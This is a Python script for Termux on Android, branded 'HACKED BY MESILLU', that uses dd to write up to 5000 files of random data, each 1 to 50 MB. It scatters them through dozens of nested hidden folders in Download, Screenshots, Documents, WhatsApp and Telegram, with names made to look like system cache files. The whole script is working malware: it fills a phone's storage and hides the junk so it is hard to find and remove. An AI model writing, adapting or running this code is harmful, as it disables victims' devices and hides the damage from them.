#!/data/data/com.termux/files/usr/bin/python3
"""
MESILLU - Creates Thousands of MB Files in Hidden Locations
"""

import os
import sys
import time
import random
import subprocess
import threading
from datetime import datetime

class MesilluHack:
    def __init__(self):
        self.total_mb = 0
        self.files_created = 0
        self.target_files = 5000  # Create 5000 files
        self.running = True
        
    def clear_screen(self):
        os.system('clear')
        
    def show_banner(self):
        """Show only the banner"""
        self.clear_screen()
        
        banner = """
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║     ███╗   ███╗███████╗███████╗██╗██╗     ██╗   ██╗     ║
║     ████╗ ████║██╔════╝██╔════╝██║██║     ██║   ██║     ║
║     ██╔████╔██║█████╗  ███████╗██║██║     ██║   ██║     ║
║     ██║╚██╔╝██║██╔══╝  ╚════██║██║██║     ██║   ██║     ║
║     ██║ ╚═╝ ██║███████╗███████║██║███████╗╚██████╔╝     ║
║     ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝╚══════╝ ╚═════╝      ║
║                                                          ║
║              HACKED BY MESILLU                          ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
        """
        
        print(banner)
        print("\n" + "="*60)
        print("    CREATING THOUSANDS OF FILES - DO NOT INTERRUPT")
        print("="*60)
        
    def get_all_locations(self):
        """Get all locations including Download, Screenshot, Documents"""
        locations = [
            # Download locations
            "/sdcard/Download/",
            "/sdcard/Download/.cache/",
            "/sdcard/Download/.temp/",
            "/sdcard/Download/.system/",
            "/sdcard/Download/Android/",
            "/sdcard/Download/.hidden/",
            
            # Screenshot locations
            "/sdcard/DCIM/Screenshots/",
            "/sdcard/DCIM/Screenshots/.cache/",
            "/sdcard/DCIM/Screenshots/.temp/",
            "/sdcard/Pictures/Screenshots/",
            "/sdcard/Pictures/Screenshots/.hidden/",
            "/sdcard/DCIM/.screenshots/",
            
            # Documents locations
            "/sdcard/Documents/",
            "/sdcard/Documents/.cache/",
            "/sdcard/Documents/.temp/",
            "/sdcard/Documents/.system/",
            "/sdcard/Documents/Android/",
            "/sdcard/Documents/.backup/",
            
            # System hidden directories
            "/sdcard/.android/",
            "/sdcard/.system/",
            "/sdcard/.cache/",
            "/sdcard/.temp/",
            "/sdcard/.data/",
            "/sdcard/.backup/",
            "/sdcard/.log/",
            "/sdcard/.thumb/",
            "/sdcard/.thumbnails/",
            
            # App cache directories
            "/sdcard/Android/data/.cache/",
            "/sdcard/Android/obb/.temp/",
            "/sdcard/DCIM/.thumbnails/",
            "/sdcard/DCIM/.cache/",
            "/sdcard/Pictures/.thumbnails/",
            "/sdcard/Pictures/.cache/",
            "/sdcard/Movies/.temp/",
            "/sdcard/Music/.cache/",
            "/sdcard/Music/.temp/",
            
            # Termux hidden
            "/data/data/com.termux/files/home/.cache/",
            "/data/data/com.termux/files/home/.temp/",
            "/data/data/com.termux/files/home/.system/",
            "/data/data/com.termux/files/home/.local/",
            
            # Nested hidden directories
            "/sdcard/.system/cache/",
            "/sdcard/.system/temp/",
            "/sdcard/.system/data/",
            "/sdcard/.system/backup/",
            "/sdcard/.android/cache/",
            "/sdcard/.android/temp/",
            "/sdcard/.cache/system/",
            "/sdcard/.cache/temp/",
            "/sdcard/.temp/cache/",
            "/sdcard/.temp/system/",
            
            # WhatsApp and Telegram (common apps)
            "/sdcard/WhatsApp/Media/.cache/",
            "/sdcard/WhatsApp/Media/.temp/",
            "/sdcard/Telegram/Telegram Documents/.cache/",
            "/sdcard/Telegram/Telegram Documents/.temp/",
            
            # Additional hidden spots
            "/sdcard/DCIM/.Camera/",
            "/sdcard/DCIM/.thumb/",
            "/sdcard/Pictures/.instagram/",
            "/sdcard/Pictures/.facebook/",
            "/sdcard/Download/.thumbnails/",
            "/sdcard/Documents/.thumbnails/",
        ]
        
        # Create deeper nesting for each location
        deep_locations = []
        for loc in locations:
            deep_locations.append(loc)
            # Add nested levels
            for i in range(random.randint(1, 3)):
                nested = os.path.join(loc, f".level{i}")
                deep_locations.append(nested)
                # Even deeper
                for j in range(random.randint(0, 1)):
                    deeper = os.path.join(nested, f".deep{j}")
                    deep_locations.append(deeper)
                    
        return list(set(deep_locations))  # Remove duplicates
        
    def get_random_filename(self):
        """Generate random hidden filename that looks like system files"""
        prefixes = [
            ".system", ".cache", ".temp", ".data", ".log", 
            ".dump", ".core", ".swap", ".tmp", ".bak",
            ".old", ".save", ".backup", ".restore", ".hidden",
            ".android", ".google", ".meta", ".index", ".db",
            ".thumb", ".thumbdata", ".cachedata", ".tempdata",
            ".download", ".screenshot", ".document"
        ]
        
        suffixes = [
            "dat", "bin", "tmp", "cache", "log", "bak", 
            "old", "temp", "dump", "core", "swap", "db",
            "idx", "dat", "bin", "sys", "cfg", "thumb",
            "cache", "data", "tmp", "temp"
        ]
        
        # Add random numbers for uniqueness
        name = f"{random.choice(prefixes)}_{random.randint(100000, 999999)}.{random.choice(suffixes)}"
        return name
        
    def create_mb_file(self, size_mb, location):
        """Create a single MB-sized file"""
        try:
            # Create directory if not exists
            os.makedirs(location, exist_ok=True)
            
            # Generate random filename
            filename = self.get_random_filename()
            filepath = os.path.join(location, filename)
            
            # Create file using dd (size in MB)
            subprocess.run(
                f"dd if=/dev/urandom of='{filepath}' bs=1M count={size_mb} status=none 2>/dev/null",
                shell=True,
                capture_output=True
            )
            
            # Verify file was created
            if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
                return True, filepath, size_mb
            return False, None, 0
            
        except Exception as e:
            return False, None, 0
            
    def create_thousands_files(self):
        """Create thousands of MB files across all locations"""
        self.show_banner()
        
        print(f"\n🎯 Target: {self.target_files} files")
        print("📍 Creating files in ALL locations including:")
        print("   • /sdcard/Download/")
        print("   • /sdcard/DCIM/Screenshots/")
        print("   • /sdcard/Documents/")
        print("   • Hidden system folders")
        print("⏳ This may take a while...\n")
        
        # Get all locations
        all_locations = self.get_all_locations()
        print(f"📍 Total locations: {len(all_locations)} directories")
        
        # File sizes (MB) - weighted towards smaller files for more files
        file_sizes = [1, 2, 3, 5, 10, 15, 20, 25, 30, 50]
        weights = [0.2, 0.15, 0.15, 0.1, 0.1, 0.08, 0.07, 0.06, 0.05, 0.04]
        
        # Progress tracking
        start_time = time.time()
        
        for file_count in range(1, self.target_files + 1):
            # Random location from all locations
            location = random.choice(all_locations)
            
            # Random file size
            size_mb = random.choices(file_sizes, weights=weights)[0]
            
            # Create file
            success, filepath, actual_size = self.create_mb_file(size_mb, location)
            
            if success:
                self.files_created += 1
                self.total_mb += actual_size
                
                # Calculate progress
                percent = (file_count / self.target_files) * 100
                filled = int(percent / 2)
                bar = '█' * filled + '░' * (50 - filled)
                
                # Show progress
                total_gb = self.total_mb / 1024
                
                # Extract just the folder name for display
                folder_name = os.path.basename(os.path.dirname(filepath))
                if not folder_name:
                    folder_name = os.path.dirname(filepath).split('/')[-2] if '/' in filepath else "root"
                    
                print(f"\r[{bar}] {percent:.1f}% | Files: {self.files_created}/{self.target_files} | Total: {total_gb:.2f}GB | {folder_name}/{os.path.basename(filepath)[:25]}", end="")
                
            # Small delay to avoid overheating
            if file_count % 100 == 0:
                time.sleep(0.3)
                
        # Final summary
        elapsed = time.time() - start_time
        total_gb = self.total_mb / 1024
        
        print("\n\n" + "="*60)
        print("✅ OPERATION COMPLETE!")
        print("="*60)
        print(f"📊 Files created: {self.files_created}")
        print(f"💾 Total size: {total_gb:.2f}GB ({self.total_mb:.0f}MB)")
        print(f"⏱️  Time taken: {elapsed:.0f} seconds")
        print(f"📍 Locations used: {len(set([os.path.dirname(f) for f in self.get_all_locations()]))} directories")
        print("="*60)
        
        # Show sample locations where files were created
        print("\n📁 Files hidden in these locations:")
        sample_locations = [
            "/sdcard/Download/",
            "/sdcard/Download/.cache/",
            "/sdcard/DCIM/Screenshots/",
            "/sdcard/DCIM/Screenshots/.hidden/",
            "/sdcard/Documents/",
            "/sdcard/Documents/.system/",
            "/sdcard/.android/cache/",
            "/sdcard/.system/data/",
            "/sdcard/Android/data/.cache/",
            "/sdcard/WhatsApp/Media/.temp/"
        ]
        
        for loc in sample_locations:
            print(f"   • {loc}")
            
        print("\n⚠️  All files are HIDDEN (start with .)")
        print("⚠️  Files scattered across Download, Screenshots, Documents")
        print("⚠️  Also in system hidden folders")
        print("="*60)
        
    def run(self):
        """Main run"""
        try:
            self.create_thousands_files()
            print("\n✅ Done! Press Ctrl+C to exit")
            
            # Keep running
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n📊 Final Statistics:")
            print(f"   Files created: {self.files_created}")
            print(f"   Total size: {self.total_mb/1024:.2f}GB")
            print("\n👋 Exiting...")
            sys.exit(0)

if __name__ == "__main__":
    hack = MesilluHack()
    hack.run()
